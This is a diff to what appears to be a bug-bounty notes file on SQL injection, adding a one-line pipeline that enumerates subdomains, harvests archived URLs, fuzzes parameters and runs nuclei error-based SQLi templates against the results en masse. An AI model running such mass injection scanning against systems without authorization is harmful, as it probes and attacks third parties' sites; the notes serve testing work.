@@ -1,5 +1,11 @@
 # SQLis
 
+### Mass error based sqli hunting
+
+```
+subfinder -dL domain.txt -recursive -all -silent | httpx -mc 200 | waybackurls | qsreplace -a "FUZZ" | grep "FUZZ" | sed 's/FUZZ//g' | gf sqli | sort -u | nuclei -t ~/pvt-template/SQLi/error-based-sqli/ -dast -o sqlis.txt
+```
+
 ### waymore, qsreplace, gf, ghauri
 
 ```
